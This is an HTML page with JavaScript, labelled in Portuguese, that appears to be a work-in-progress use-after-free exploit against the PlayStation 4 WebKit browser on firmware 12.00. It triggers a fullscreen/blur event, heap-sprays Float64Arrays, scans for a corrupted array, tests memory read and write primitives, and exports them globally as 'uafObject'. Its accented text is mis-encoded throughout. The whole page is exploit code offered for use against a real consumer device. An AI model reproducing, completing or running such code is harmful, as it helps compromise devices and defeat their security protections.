<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Immediate Detection</title>
</head>
<body>
    <h1>PS4 WebKit UAF - DetecÃ§Ã£o Imediata</h1>
    <h2 style="color:green;">âœ… VersÃ£o 12.00 - Timing Otimizado</h2>
    
    <h3>EstratÃ©gia:</h3>
    <ul>
        <li>ğŸ”„ Verifica UAF <b>DURANTE</b> o spray (nÃ£o depois)</li>
        <li>âš¡ DetecÃ§Ã£o em tempo real</li>
        <li>ğŸ¯ Previne GC cleanup</li>
    </ul>
    
    <button onclick="runImmediateDetection()" style="padding:20px; font-size:18px; background:blue; color:white;">
        â–¶ï¸ DETECÃ‡ÃƒO IMEDIATA
    </button>
    
    <button onclick="runAggressiveSpray()" style="padding:20px; font-size:18px; background:orange; color:white;">
        ğŸ”¥ MODO AGRESSIVO (Spray ContÃ­nuo)
    </button>
    
    <button onclick="clearLog()" style="padding:20px; font-size:18px; background:gray; color:white;">
        ğŸ—‘ï¸ LIMPAR
    </button>
    
    <hr>
    <div id="log" style="font-family:monospace; font-size:14px; margin-top:20px;"></div>
    
    <script>
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            if(clean.length !== 16) return 0.0;
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8);
            let u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        const P_A = h2f("0x4141414141414141");
        const M_V = h2f("0xDEADBEEFCAFEBABE");
        const W_V = h2f("0x1337133713371337");
        
        function log(msg, color) {
            const logDiv = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            logDiv.innerHTML += '<div style="color:' + (color || 'black') + '">[' + time + '] ' + msg + '</div>';
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        // ESTRATÃ‰GIA 1: DetecÃ§Ã£o Imediata
        function runImmediateDetection() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'blue');
            log('DETECÃ‡ÃƒO IMEDIATA - v2.0', 'blue');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'blue');
            log('');
            
            log('[INIT] Criando 5000 controllers...', 'blue');
            const controllers = [];
            
            for(let i = 0; i < 5000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                controllers.push(arr);
            }
            
            log('[INIT] âœ… Controllers criados', 'green');
            log('[WAIT] âš ï¸ APERTE OPTIONS!', 'red');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('[BLUR] ğŸ¯ Detectado! Spray + verificaÃ§Ã£o simultÃ¢nea...', 'orange');
                
                let corrupted = null;
                let corruptedIdx = -1;
                let sprayCount = 0;
                const spray = [];
                
                // Spray com verificaÃ§Ã£o intercalada
                for(let i = 0; i < 8000; i++) {
                    // Cria spray
                    const s = new Float64Array(10);
                    s.fill(P_A);
                    spray.push(s);
                    sprayCount++;
                    
                    // Verifica a cada 100 iteraÃ§Ãµes
                    if (i % 100 === 0) {
                        for(let j = 0; j < controllers.length; j++) {
                            if (controllers[j][0] === P_A) {
                                corrupted = controllers[j];
                                corruptedIdx = j;
                                
                                log('[UAF] ğŸ‰ DETECTADO na iteraÃ§Ã£o ' + i + '!', 'green');
                                log('[UAF] ğŸ“ Index: controllers[' + corruptedIdx + ']', 'green');
                                
                                // Testa imediatamente
                                testPrimitives(corrupted, spray, corruptedIdx);
                                return;
                            }
                        }
                    }
                }
                
                // VerificaÃ§Ã£o final
                log('[SCAN] VerificaÃ§Ã£o final completa...', 'blue');
                for(let i = 0; i < controllers.length; i++) {
                    if (controllers[i][0] === P_A) {
                        corrupted = controllers[i];
                        corruptedIdx = i;
                        log('[UAF] ğŸ‰ DETECTADO na verificaÃ§Ã£o final!', 'green');
                        testPrimitives(corrupted, spray, corruptedIdx);
                        return;
                    }
                }
                
                log('[UAF] âŒ NÃ£o detectado', 'red');
                log('[DEBUG] Sample:', 'orange');
                for(let i = 0; i < 5; i++) {
                    log('  [' + i + '] = ' + f2h(controllers[i][0]), 'orange');
                }
            };
        }
        
        // ESTRATÃ‰GIA 2: Spray Agressivo e ContÃ­nuo
        function runAggressiveSpray() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'orange');
            log('MODO AGRESSIVO - Spray ContÃ­nuo', 'orange');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'orange');
            log('');
            
            log('[INIT] Criando 10000 controllers (pool maior)...', 'blue');
            const controllers = [];
            
            for(let i = 0; i < 10000; i++) {
                const arr = new Float64Array(16); // Arrays maiores
                arr[0] = i;
                controllers.push(arr);
            }
            
            log('[INIT] âœ… Pool criado', 'green');
            log('[WAIT] âš ï¸ APERTE OPTIONS!', 'red');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('[BLUR] ğŸ¯ Spray agressivo iniciando...', 'orange');
                
                const spray = [];
                let found = false;
                
                // Spray em 3 ondas com verificaÃ§Ã£o
                for(let wave = 0; wave < 3; wave++) {
                    log('[WAVE] Onda ' + (wave + 1) + '/3...', 'blue');
                    
                    // Spray de 10K arrays
                    for(let i = 0; i < 10000; i++) {
                        const s = new Float64Array(16);
                        s.fill(P_A);
                        spray.push(s);
                        
                        // Verifica a cada 500
                        if (i % 500 === 0 && !found) {
                            for(let j = 0; j < controllers.length; j++) {
                                if (controllers[j][0] === P_A) {
                                    found = true;
                                    log('[UAF] ğŸ‰ DETECTADO! Onda ' + (wave+1) + ', iteraÃ§Ã£o ' + i, 'green');
                                    log('[UAF] ğŸ“ controllers[' + j + ']', 'green');
                                    testPrimitives(controllers[j], spray, j);
                                    return;
                                }
                            }
                        }
                    }
                    
                    // ForÃ§a garbage collection entre ondas
                    const trash = [];
                    for(let i = 0; i < 1000; i++) {
                        trash.push(new Float64Array(100));
                    }
                    trash.length = 0;
                }
                
                // VerificaÃ§Ã£o final
                log('[FINAL] VerificaÃ§Ã£o final...', 'blue');
                for(let i = 0; i < controllers.length; i++) {
                    if (controllers[i][0] === P_A) {
                        log('[UAF] ğŸ‰ DETECTADO na verificaÃ§Ã£o final!', 'green');
                        testPrimitives(controllers[i], spray, i);
                        return;
                    }
                }
                
                log('[UAF] âŒ NÃ£o detectado apÃ³s 30K arrays', 'red');
                log('[INFO] Isso Ã© ANORMAL - o crash PoC funcionou!', 'orange');
                log('[INFO] PossÃ­vel causa: GC muito agressivo no FW 12.00', 'orange');
            };
        }
        
        function testPrimitives(corrupted, spray, idx) {
            log('', '');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
            log('TESTANDO PRIMITIVES', 'purple');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
            log('', '');
            
            // Read Test
            log('[READ] ConteÃºdo do array corrompido:', 'blue');
            for(let i = 0; i < 8; i++) {
                log('  [' + i + '] = ' + f2h(corrupted[i]), 'cyan');
            }
            log('[READ] âœ… Read OK', 'green');
            log('', '');
            
            // Write Test
            log('[WRITE] Testando escrita...', 'blue');
            corrupted[4] = M_V;
            const readback = f2h(corrupted[4]);
            log('[WRITE] Escrito: ' + f2h(M_V), 'cyan');
            log('[WRITE] Lido: ' + readback, 'cyan');
            
            if (readback === f2h(M_V)) {
                log('[WRITE] âœ… Write OK', 'green');
            } else {
                log('[WRITE] âš ï¸ Write falhou', 'orange');
            }
            log('', '');
            
            // Identity Test
            log('[IDENTITY] Procurando no spray...', 'blue');
            let found = false;
            for(let i = 0; i < spray.length; i++) {
                if (spray[i][4] === M_V) {
                    log('[IDENTITY] âœ… Encontrado em spray[' + i + ']', 'green');
                    
                    // Teste reverso
                    spray[i][5] = W_V;
                    if (corrupted[5] === W_V) {
                        log('[IDENTITY] âœ… Bidirecional confirmado!', 'green');
                    }
                    found = true;
                    break;
                }
            }
            
            if (!found) {
                log('[IDENTITY] âš ï¸ NÃ£o encontrado no spray', 'orange');
            }
            log('', '');
            
            // DataView Test
            log('[DATAVIEW] Teste de escrita raw...', 'blue');
            try {
                const dv = new DataView(corrupted.buffer);
                const before = f2h(corrupted[0]);
                dv.setUint32(0, 0xDEADBEEF, true);
                const after = f2h(corrupted[0]);
                
                log('[DATAVIEW] Antes: ' + before, 'cyan');
                log('[DATAVIEW] Depois: ' + after, 'cyan');
                
                if (before !== after) {
                    log('[DATAVIEW] âœ… OK', 'green');
                } else {
                    log('[DATAVIEW] âš ï¸ Sem mudanÃ§a', 'orange');
                }
            } catch(e) {
                log('[DATAVIEW] âŒ Erro: ' + e.message, 'red');
            }
            log('', '');
            
            // Export global
            window.uafObject = {
                corrupted: corrupted,
                index: idx,
                read: function(i) { return f2h(corrupted[i]); },
                write: function(i, hex) { corrupted[i] = h2f(hex); }
            };
            
            log('ğŸ¯ EXPLOIT COMPLETO!', 'green');
            log('ğŸ”§ window.uafObject disponÃ­vel', 'blue');
            log('', '');
        }
    </script>
</body>
</html>
